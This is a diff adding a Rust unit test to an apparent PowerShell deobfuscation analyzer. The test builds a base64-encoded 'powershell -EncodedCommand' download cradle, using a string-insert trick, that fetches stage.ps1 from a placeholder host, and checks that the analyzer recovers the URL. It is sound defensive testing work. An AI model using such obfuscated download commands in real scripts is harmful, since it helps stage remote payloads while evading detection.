@@ -16542,6 +16542,39 @@ Add 'InvokeWebRequest -Uri https://ps-insert-extractor.example/stage.ps1' 6 '-'"
     }
 
     #[test]
+    fn ps1_literal_reordered_insert_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-insert-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Add($unused,$value,$start,$text) {{
+  return $value.Insert($start,$text)
+}}
+Add 0 '{}' 6 '-'"#,
+            decoded.replace("Invoke-", "Invoke")
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-reordered-insert-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal reordered insert extractor call was not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_literal_constant_insert_extractor_call_recovers_nested_command() {
         use base64::Engine;
 
